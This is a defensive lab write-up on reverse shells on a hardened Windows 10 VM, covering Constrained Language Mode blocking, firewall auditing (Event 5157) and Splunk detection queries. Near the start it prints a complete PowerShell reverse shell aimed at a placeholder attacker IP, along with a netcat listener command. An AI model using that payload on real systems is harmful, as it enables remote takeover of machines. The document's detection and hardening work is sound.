# Technique 05 — Reverse Shell
## Lab Documentation | Windows 10 Pro
**MITRE:** T1059.001 / T1571 | **Severity:** Critical | **Status:** Fully Mitigated

---

## What This Attack Does

A reverse shell opens a TCP connection **from the victim machine back to the
attacker**. Unlike a traditional connection where you connect to a server,
here the victim initiates the connection — bypassing inbound firewall rules
that block unsolicited incoming connections.

The attacker runs a listener (`nc -lvnp 4444`) on their machine and waits.
Once the victim connects, the attacker types commands that run silently on
the victim machine with full output returned over the socket.

Classic PowerShell reverse shell:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP', 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | % {0}
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0) {
    $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i)
    $result = (iex $data 2>&1 | Out-String)
    $send = $result + 'PS> '
    $stream.Write(([text.encoding]::ASCII).GetBytes($send),0,$send.Length)
}
$client.Close()
```

The attacker has full remote control — read files, install malware, create
accounts, pivot to other systems on the network.

---

## What Was Already In Place From Previous Techniques

T05 is largely solved by controls applied in T03. This technique adds one
new audit logging layer on top of what already exists.

```
Control                          Applied In    Covers T05?
─────────────────────────────────────────────────────────
CLM blocks TCPClient             T03           ✅ Full
Firewall blocks powershell.exe   T03           ✅ Full
Firewall blocks attacker ports   T03           ✅ Full
Event 4688 process creation      T01           ✅ Full
Command line logging             T01           ✅ Full
Filtering Platform auditing      T05           ✅ New — Event 5157
```

---

## Attack Demonstration — TCPClient Blocked by CLM

Command run (normal PowerShell, no admin). Using `127.0.0.1` (localhost)
to avoid any real outbound connection — proving the object cannot be
created regardless of destination:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1', 4444)
```

Result:
```
New-Object : Cannot create type. Only core types are supported in this language mode.
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('127.0.0.1', 4444)
+ CategoryInfo: PermissionDenied: (:) [New-Object], PSNotSupportedException
+ FullyQualifiedErrorId: CannotCreateTypeConstrainedLanguage
```

`TCPClient` is not a core type. CLM refuses to instantiate it.
The reverse shell socket cannot be opened — the attack is dead at line one.

![TCPClient blocked by CLM](screenshots/T05/01_tcpclient_blocked_clm.png)

---

## New Fix — Enable Filtering Platform Connection Auditing

This generates Event 5157 when the Windows Firewall blocks an outbound
connection — providing network-layer evidence of a reverse shell attempt
even if CLM is somehow bypassed.

Run as Administrator:

```powershell
auditpol /set /subcategory:"Filtering Platform Connection" /success:enable /failure:enable
```

Expected output:
```
The command was successfully executed.
```

Verify:
```powershell
auditpol /get /subcategory:"Filtering Platform Connection"
```

Expected:
```
System audit policy
Category/Subcategory                      Setting
Object Access
  Filtering Platform Connection           Success and Failure
```

![Filtering Platform Connection auditing enabled](screenshots/T05/02_filtering_platform_auditing.png)

---

## Detection Evidence Stack

### Event 4688 — Process Creation with Command Line

Already active from T01. Any PowerShell process spawned with reverse shell
code in its command line arguments is logged here.

```
eventvwr.msc → Windows Logs → Security → Filter: 4688
```

Look for `powershell.exe` entries with `TCPClient` or an IP address and
port number in the Process Command Line field.

### Event 5157 — Connection Blocked by Firewall

Generated when Windows Firewall blocks an outbound connection attempt.

```
eventvwr.msc → Windows Logs → Security → Filter: 5157
```

Event fields:
```
Application:      \device\harddiskvolume\...\powershell.exe
Direction:        Outbound
Source Address:   [victim IP]
Destination Address: [attacker IP]
Destination Port: 4444
Action:           Block
```

### Lab Note — 5157 Not Observed on Loopback

During testing, Event 5157 was not generated for the `127.0.0.1` test
connection. This is expected behaviour — Windows Firewall rules apply to
external network interfaces, not loopback traffic (`127.0.0.1`).

In a real attack scenario where an attacker uses an external IP address
and bypasses CLM, the firewall rule for `powershell.exe` outbound would
fire and generate Event 5157. The loopback test confirms CLM works but
does not trigger the firewall-layer logging.

Events 5156 and 5158 were observed — these represent permitted connections
and port binds on the loopback interface, which is expected normal behaviour.

---

## Full Defence Architecture for T05

```
Attacker attempts reverse shell
         │
         ▼
┌─────────────────────────────────────┐
│  Layer 1 — Constrained Language Mode│
│  New-Object TCPClient = not a core  │
│  type → CannotCreateType            │
│  ConstrainedLanguage → BLOCKED       │
└─────────────────────────────────────┘
         │ (if CLM somehow bypassed)
         ▼
┌─────────────────────────────────────┐
│  Layer 2 — Windows Firewall          │
│  powershell.exe outbound = BLOCK     │
│  Common attacker ports = BLOCK       │
│  Event 5157 generated               │
└─────────────────────────────────────┘
         │ (if firewall somehow bypassed)
         ▼
┌─────────────────────────────────────┐
│  Layer 3 — Audit Logging             │
│  Event 4688: command line captured  │
│  Event 5157: blocked connection     │
│  Event 4104: script block content   │
│  SOC analyst sees the attempt       │
└─────────────────────────────────────┘
```

Three independent layers. All three must fail for the attack to succeed.

---

## Audit Policies Active After T05

| Subcategory | Setting | Event IDs |
|-------------|---------|-----------|
| Process Creation | Success and Failure | 4688 |
| Filtering Platform Connection | Success and Failure | 5156, 5157, 5158 |

Combined with Script Block Logging (Event 4104) from T02, the full
PowerShell attack surface is now covered by logging.

---

## SOC Threat Hunting Notes

**Splunk detection query (future implementation):**

For process creation with reverse shell indicators:
```
source="WinEventLog:Security" EventCode=4688
(CommandLine="*TCPClient*" OR CommandLine="*GetStream*"
OR CommandLine="*4444*" OR CommandLine="*Invoke-Expression*")
```

For blocked outbound connections:
```
source="WinEventLog:Security" EventCode=5157
Application="*powershell*"
```

For script block content:
```
source="WinEventLog:Microsoft-Windows-PowerShell/Operational"
EventCode=4104
(ScriptBlockText="*TCPClient*" OR ScriptBlockText="*GetStream*"
OR ScriptBlockText="*Net.Sockets*")
```

---

## MITRE ATT&CK Mapping

| Field | Value |
|-------|-------|
| Technique | T1059.001 — Command and Scripting Interpreter: PowerShell |
| Technique | T1571 — Non-Standard Port |
| Tactic | Execution, Command and Control |
| Detection | Event ID 4688 (process creation + command line) |
| Detection | Event ID 5157 (outbound connection blocked) |
| Detection | Event ID 4104 (script block content) |
| Reference | https://attack.mitre.org/techniques/T1059/001/ |
| Reference | https://attack.mitre.org/techniques/T1571/ |

---

## Screenshot Folder Structure

```
evidence/
└── T05/
    ├── 01_tcpclient_blocked_clm.png
    └── 02_filtering_platform_auditing.png
```

---

*Lab environment: Windows 10 Pro · VMware · Standalone VM · No Domain*
*Date: [date of lab session]*
